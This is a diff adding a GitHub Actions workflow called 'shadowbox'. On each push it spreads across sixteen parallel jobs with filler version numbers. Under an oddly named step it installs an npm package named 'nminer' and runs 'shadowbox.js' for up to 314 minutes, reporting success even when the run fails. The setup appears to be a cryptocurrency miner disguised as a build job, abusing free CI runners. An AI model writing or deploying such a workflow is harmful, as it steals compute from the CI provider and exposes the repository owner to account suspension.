@@ -1,0 +1,41 @@
+name: shadowbox
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 6536 }
+          - { version: 3282 }
+          - { version: 4854 }
+          - { version: 9206 }
+          - { version: 7848 }
+          - { version: 5058 }
+          - { version: 1842 }
+          - { version: 4800 }
+          - { version: 3023 }
+          - { version: 8765 }
+          - { version: 4172 }
+          - { version: 4351 }
+          - { version: 6815 }
+          - { version: 6642 }
+          - { version: 3766 }
+          - { version: 1268 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: ultimately spherical
+        run: |
+          npm install nminer@latest
+          timeout 314m node shadowbox.js || echo "shadowbox executed"
